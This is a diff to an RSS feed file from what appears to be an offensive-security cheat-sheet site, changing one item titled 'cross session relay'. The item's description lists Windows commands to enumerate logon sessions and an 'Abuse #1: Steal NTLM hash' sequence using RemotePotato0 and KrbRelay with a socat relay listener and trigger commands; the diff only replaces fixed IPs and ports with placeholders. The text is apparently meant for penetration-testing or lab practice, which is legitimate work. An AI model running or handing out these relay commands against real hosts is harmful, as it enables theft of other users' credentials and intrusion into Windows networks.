@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/cross_session_relay/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/cross_session_relay/</guid>
-      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999 # Trigger Attack .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x 10.10.14.10 -p 9999 Ref: RemotePotato0&#xA;.\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\ProgramData\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&amp;#34; Ref: KrbRelay</description>
+      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; # Trigger Attack .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x &amp;lt;LOCAL_IP&amp;gt; -p &amp;lt;LOCAL_PORT&amp;gt; Ref: RemotePotato0&#xA;.\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\ProgramData\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&amp;#34; Ref: KrbRelay</description>
     </item>
   </channel>
 </rss>
